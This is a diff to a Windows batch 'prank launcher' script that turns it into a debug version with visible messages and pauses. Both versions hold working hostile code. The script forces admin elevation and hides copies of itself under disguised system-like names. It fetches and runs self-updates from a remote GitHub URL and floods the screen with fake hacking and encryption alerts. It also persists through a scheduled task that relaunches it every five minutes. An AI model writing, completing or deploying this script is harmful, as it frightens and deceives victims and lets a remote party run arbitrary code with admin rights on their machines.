@@ -2,20 +2,18 @@
 setlocal enabledelayedexpansion
 
 :: ============================================================
-::   AUTO‑UPDATING PRANK LAUNCHER (single file, no Python)
-::   Stores files in %LOCALAPPDATA%\.sysupdatecom (hidden)
-::   Automatically requests admin rights if needed
+::   AUTO‑UPDATING PRANK LAUNCHER (DEBUG VERSION)
 :: ============================================================
 
 :: ---------- CHECK FOR ADMIN ----------
 net session >nul 2>&1
 if %errorlevel% neq 0 (
-    :: Not admin – relaunch with elevation
+    echo Not admin – launching elevated...
     powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs"
     exit /b
 )
-:: Now running as admin
-:: =====================================
+echo Running as admin – continuing...
+pause
 
 :: ---------- CONFIGURATION ----------
 set "BASE=%LOCALAPPDATA%\.sysupdatecom"
@@ -25,19 +23,34 @@ set "SELF_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/launcher.cmd
 set "LOCAL_VER=%BASE%\local_version.txt"
 set "REMOTE_VER=%TEMP%\rv.txt"
 set "MAX_RETRIES=3"
-:: ===================================
+echo Configuration set.
+pause
 
-:: Create base folder (if not exist) and hide it
+:: Create base folder
 if not exist "%BASE%" mkdir "%BASE%"
-attrib +h "%BASE%" >nul 2>&1
+if errorlevel 1 (
+    echo ERROR: Cannot create %BASE%
+    pause
+    exit /b 1
+)
+attrib +h "%BASE%"
+echo Base folder ready.
+pause
 
-:: Self‑install (copy ourselves to BASE)
+:: Self‑install
 if /i not "%~f0"=="%SELF%" (
-    copy /Y "%~f0" "%SELF%" >nul
-    attrib +h "%SELF%" >nul 2>&1
+    copy /Y "%~f0" "%SELF%"
+    if errorlevel 1 (
+        echo ERROR: Cannot copy self to %SELF%
+        pause
+        exit /b 1
+    )
+    attrib +h "%SELF%"
+    echo Self installed.
+    pause
 )
 
-:: ---------- FUNCTION: DOWNLOAD WITH RETRIES ----------
+:: ---------- DOWNLOAD FUNCTION ----------
 :DOWNLOAD
 set "URL=%~1"
 set "OUT=%~2"
@@ -46,28 +59,31 @@ set "RETRY_COUNT=0"
 :RETRY_LOOP
 set /a RETRY_COUNT+=1
 if !RETRY_COUNT! gtr %MAX_RETRIES% (
+    echo ERROR: Failed to download %URL% after %MAX_RETRIES% attempts.
     exit /b 1
 )
 
-:: Method 1: PowerShell
-powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '!URL!' -OutFile '!OUT!' -UseBasicParsing -ErrorAction Stop } catch { exit 1 }" >nul 2>&1
+echo Attempt !RETRY_COUNT! to download %URL% ...
+powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '!URL!' -OutFile '!OUT!' -UseBasicParsing -ErrorAction Stop } catch { exit 1 }" 
 if exist "!OUT!" (
-    for %%A in ("!OUT!") do if %%~zA gtr 0 exit /b 0
-)
-
-:: Method 2: curl (if available)
-where curl >nul 2>&1
-if !errorlevel! equ 0 (
-    curl -s -L -o "!OUT!" "!URL!" >nul 2>&1
-    if exist "!OUT!" (
-        for %%A in ("!OUT!") do if %%~zA gtr 0 exit /b 0
+    for %%A in ("!OUT!") do if %%~zA gtr 0 (
+        echo Download successful.
+        exit /b 0
     )
 )
-
-:: Wait a bit and retry
+where curl >nul 2>&1
+if !errorlevel! equ 0 (
+    curl -s -L -o "!OUT!" "!URL!"
+    if exist "!OUT!" (
+        for %%A in ("!OUT!") do if %%~zA gtr 0 (
+            echo Download successful via curl.
+            exit /b 0
+        )
+    )
+)
+echo Download failed, retrying...
 timeout /t 2 /nobreak >nul
 goto RETRY_LOOP
-:: ------------------------------------------------
 
 :: ---------- CHECK FOR UPDATES ----------
 call :DOWNLOAD "%VERSION_URL%" "%REMOTE_VER%"
@@ -78,33 +94,43 @@ if exist "%REMOTE_VER%" (
         echo Updating from !LOCAL! to !REMOTE! ...
         call :DOWNLOAD "%SELF_URL%" "%TEMP%\update.cmd"
         if exist "%TEMP%\update.cmd" (
-            :: Rename current script (still running) to .old
-            move /Y "%SELF%" "%SELF%.old" >nul
-            :: Move new version into place
-            move /Y "%TEMP%\update.cmd" "%SELF%" >nul
-            :: Update version file
+            move /Y "%SELF%" "%SELF%.old"
+            move /Y "%TEMP%\update.cmd" "%SELF%"
             echo !REMOTE! > "%LOCAL_VER%"
-            :: Hide the new file
-            attrib +h "%SELF%" >nul 2>&1
-            :: Launch the new version
+            attrib +h "%SELF%"
+            echo Update complete – launching new version.
             start "" "%SELF%"
             exit
         ) else (
-            echo Failed to download update.
+            echo ERROR: Failed to download update.
+            pause
         )
+    ) else (
+        echo Already up to date.
     )
+) else (
+    echo WARNING: Could not fetch version info.
 )
+pause
 
-:: ---------- PRANK CODE (embedded) ----------
+:: ---------- PRANK CODE ----------
 title SYSTEM BREACH DETECTED
 color 0a
 for /l %%i in (1,1,5) do (
     start "SECURITY ALERT %%i" cmd /c "color 4 && title CRITICAL ERROR %%i && echo. && echo [!] Unauthorized Access Detected... && echo. && echo Hacking Laptop... %%i%% && echo. && echo Accessing Camera... && echo Accessing Files... && echo Encrypting Data... && echo. && echo DO NOT TURN OFF YOUR COMPUTER! && echo. && echo Press any key to attempt recovery... && pause > nul"
 )
 timeout /t 2 > nul
-:: ==========================================
+echo Prank launched.
+pause
 
-:: ---------- SCHEDULE TASK (every 5 min, runs at startup) ----------
-schtasks /create /tn "SyslogLauncher" /tr "cmd /c start /min \"\" \"%SELF%\"" /sc minute /mo 5 /f >nul 2>&1
+:: ---------- SCHEDULE TASK ----------
+schtasks /create /tn "SyslogLauncher" /tr "cmd /c start /min \"\" \"%SELF%\"" /sc minute /mo 5 /f
+if errorlevel 1 (
+    echo ERROR: Failed to create scheduled task.
+    pause
+) else (
+    echo Scheduled task created.
+    pause
+)
 
 endlocal
